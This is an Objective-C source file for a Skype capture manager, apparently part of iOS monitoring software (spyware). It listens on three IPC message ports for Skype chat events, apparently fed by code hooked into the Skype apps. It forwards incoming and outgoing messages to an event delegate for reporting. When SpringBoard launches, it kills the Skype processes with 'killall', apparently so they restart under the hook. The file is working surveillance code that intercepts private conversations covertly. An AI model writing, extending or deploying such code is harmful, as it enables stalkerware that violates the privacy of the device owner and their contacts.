//
//  SkypeCaptureManager.m
//  SkypeCaptureManager
//
//  Created by Makara Khloth on 12/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SkypeCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "SpringBoardServices.h"
#import "SBDidLaunchNotifier.h"
#import "FxIMEventUtils.h"

@interface SkypeCaptureManager (private)
- (void) sendEvent: (FxIMEvent *) aIMEvent;
- (BOOL) isSkypeIpadAppRunning;
- (void) springboardDidLaunch;
@end

#define SKYPE_INDENTIFIER			@"com.skype.skype"
#define SKYPEFORIPAD_INDENTIFIER	@"com.skype.SkypeForiPad"

@implementation SkypeCaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
		mSBNotifier = [[SBDidLaunchNotifier alloc] init];
		[mSBNotifier setMDelegate:self];
		[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Skype messenger");
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeMessagePort1 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
		//[mSBNotifier start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];		
	}
	if (!mMessagePortReader3) {
		mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader3 start];		
	}
	
		
	if (mMessagePortReader1	|| mMessagePortReader2 || mMessagePortReader3)
		[mSBNotifier start];
}

- (void) stopCapture {
	DLog (@"Stop capture Skype messenger");
	if (mMessagePortReader1 || mMessagePortReader2 || mMessagePortReader3) {
		[mSBNotifier stop];
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
		//[mSBNotifier stop];
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
	if (mMessagePortReader3) {
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
	}	
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
	NSDictionary *skypeInfo = [unarchiver decodeObjectForKey:kSkypeArchived];
	NSString *bundleIdentifier = [skypeInfo objectForKey:@"bundle"];
    FxIMEvent *imEvent = [skypeInfo objectForKey:@"IMEvent"];
    [unarchiver finishDecoding];
	DLog(@"Skype - imEvent = %@, bundle = %@", imEvent, bundleIdentifier);
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		if ([imEvent mDirection] == kEventDirectionIn) {
			if ([bundleIdentifier isEqualToString:SKYPEFORIPAD_INDENTIFIER]) {
				//[mEventDelegate performSelector:@selector(eventFinished:) withObject:imEvent];
				[self sendEvent:imEvent];
			} else if ([bundleIdentifier isEqualToString:SKYPE_INDENTIFIER]) {
				if (![self isSkypeIpadAppRunning]) { // Always true when this logic is run in Iphone
					//[mEventDelegate performSelector:@selector(eventFinished:) withObject:imEvent];
					[self sendEvent:imEvent];
				}
			}
		} else if ([imEvent mDirection] == kEventDirectionOut) { // Only most front application is called... (unlike facebook & messenger)
			//[mEventDelegate performSelector:@selector(eventFinished:) withObject:imEvent];
			[self sendEvent:imEvent];
		}
	}
	[unarchiver release];
}

- (void) sendEvent: (FxIMEvent *) aIMEvent {
	NSArray *imStructureArray = [FxIMEventUtils digestIMEvent:aIMEvent];	
	for (FxEvent *imStructure in imStructureArray) {		
		DLog (@"sending %@ ...", imStructure)			
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructure];		
	}
}

- (BOOL) isSkypeIpadAppRunning {
	BOOL isSkypeIpadAppRunning = NO;
	NSArray *activeApps = (NSArray *)SBSCopyApplicationDisplayIdentifiers(YES, NO); // It returns wrongly after respring
	DLog (@"All active apps = %@", activeApps);
	for (NSString *bundleIdentifier in activeApps) {
		if ([bundleIdentifier isEqualToString:SKYPEFORIPAD_INDENTIFIER]) {
			isSkypeIpadAppRunning = YES;
			break;
		}
	}
	[activeApps release];
	return (isSkypeIpadAppRunning);
}

- (void) springboardDidLaunch {
	system("killall Skype"); // Skype for iPad
	system("killall Skype"); // Skype for iPhone
}

- (void) dealloc {
	[self stopCapture];
	[mSBNotifier release];
	[super dealloc];
}

@end
